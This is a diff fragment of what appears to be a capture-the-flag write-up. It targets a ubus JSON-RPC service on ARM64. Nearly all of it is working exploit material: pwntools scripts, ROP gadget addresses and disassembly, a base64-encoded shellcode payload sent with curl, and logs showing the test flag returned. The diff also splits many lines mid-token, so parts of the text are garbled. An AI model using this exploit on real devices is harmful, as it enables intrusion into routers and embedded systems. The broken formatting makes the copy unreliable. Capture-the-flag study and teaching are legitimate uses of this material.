-.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
-.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
-.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
-.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
-.text:00000000004579C0 60 2E FF 97 BL sub_423340
+.text:
+00000000004579A4 E2 00 80 52 MOV W2, #7
+.text:
+00000000004579A8 FD 03 00 91 MOV X29, SP
+.text:
+00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
+.text:
+00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
+.text:
+00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
+.text:
+00000000004579B8 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004579BC 60 00 00 8B ADD X0, X3, X0
+.text:
+00000000004579C0 60 2E FF 97 BL sub_423340
 '''
 magic_gadget = 0x00000000004579A4
 
@@ -1538,8 +1508,8 @@ gadget7 = 0x0000000000400898
 
 mprotect_addr = 0x423340
 base64_decode_addr = 0x4a2098
-#p1 += p64(0x00000000004579A4)
-#p1 += p64(0x0000000000403ad8)
+    #p1 += p64(0x00000000004579A4)
+    #p1 += p64(0x0000000000403ad8)
 '''
 p1 += p64(gadget4)
 p1 += b'x00' * 0x20
@@ -1571,16 +1541,13 @@ li(p2)
 r.sendline(p2)
 
 r.interactive()
-```
-
-
-
-```
-* Trying 127.0.0.1:9999...
+* Trying 127.0.0.1:
+9999...
 * TCP_NODELAY set
 * Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
 > POST /ubus HTTP/1.1
-> Host: 127.0.0.1:9999
+> Host: 127.0.0.1:
+9999
 > User-Agent: curl/7.68.0
 > Accept: */*
 > Content-Length: 1721
@@ -1598,12 +1565,8 @@ r.interactive()
 < Content-Type: application/json
 <
 * Connection #0 to host 127.0.0.1 left intact
-{"jsonrpc":"2.0","id":null,"result":[2]}
-```
-
-
-
-```
+{"jsonrpc":"2.0","id":
+null,"result":[2]}
 from pwn import *
 from os import system
 import base64
@@ -1665,22 +1628,35 @@ blr x20
 '''
 
 '''
-.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
-.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
-.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
-.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
-.text:00000000004578B8 A2 2E FF 97 BL sub_423340
+.text:
+00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
+.text:
+00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
+.text:
+00000000004578B0 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004578B4 80 00 00 8B ADD X0, X4, X0
+.text:
+00000000004578B8 A2 2E FF 97 BL sub_423340
 '''
 
 '''
-.text:00000000004579A4 E2 00 80 52 MOV W2, #7
-.text:00000000004579A8 FD 03 00 91 MOV X29, SP
-.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
-.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
-.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
-.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
-.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
-.text:00000000004579C0 60 2E FF 97 BL sub_423340
+.text:
+00000000004579A4 E2 00 80 52 MOV W2, #7
+.text:
+00000000004579A8 FD 03 00 91 MOV X29, SP
+.text:
+00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
+.text:
+00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
+.text:
+00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
+.text:
+00000000004579B8 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004579BC 60 00 00 8B ADD X0, X3, X0
+.text:
+00000000004579C0 60 2E FF 97 BL sub_423340
 '''
 magic_gadget = 0x00000000004579A4
 
@@ -1689,8 +1665,8 @@ gadget7 = 0x0000000000400898
 
 mprotect_addr = 0x423340
 base64_decode_addr = 0x4a2098
-#p1 += p64(0x00000000004579A4)
-#p1 += p64(0x0000000000403ad8)
+    #p1 += p64(0x00000000004579A4)
+    #p1 += p64(0x0000000000403ad8)
 '''
 p1 += p64(gadget4)
 p1 += b'x00' * 0x20
@@ -1722,37 +1698,33 @@ li(p2)
 r.sendline(p2)
 
 r.interactive()
-```
-
-
-
-```
 from pwn import *
 from os import system
 
 li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')
 
-ip = 'http://127.0.0.1:9999/ubus'
+ip = 'http://127.0.0.1:
+9999/ubus'
 
 p1 = '7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=='
 
-shell = '''curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "''' + p1 + '''"}]}' ''' + ip
+shell = '''curl -v -d '{"jsonrpc":"2.0","id":
+null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "''' + p1 + '''"}]}' ''' + ip
 
 li(shell)
 
 system(shell)
-```
-
-
-
-```
-curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=="}]}' http://127.0.0.1:9999/ubus
-* Trying 127.0.0.1:9999...
+curl -v -d '{"jsonrpc":"2.0","id":
+null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=="}]}' http://127.0.0.1:
+9999/ubus
+* Trying 127.0.0.1:
+9999...
 * TCP_NODELAY set
 * Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
 > POST /ubus HTTP/1.1
-> Host: 127.0.0.1:9999
+> Host: 127.0.0.1:
+9999
 > User-Agent: curl/7.68.0
 > Accept: */*
 > Content-Length: 1721
@@ -1770,7 +1742,8 @@ curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["0000000000
 < Content-Type: application/json
 <
 * Connection #0 to host 127.0.0.1 left intact
-{"jsonrpc":"2.0","id":null,"result":[0,{"output":"flag{This_is_test_flag}naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}
+{"jsonrpc":"2.0","id":
+null,"result":[0,{"output":"flag{This_is_test_flag}naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}
 ```
 
 
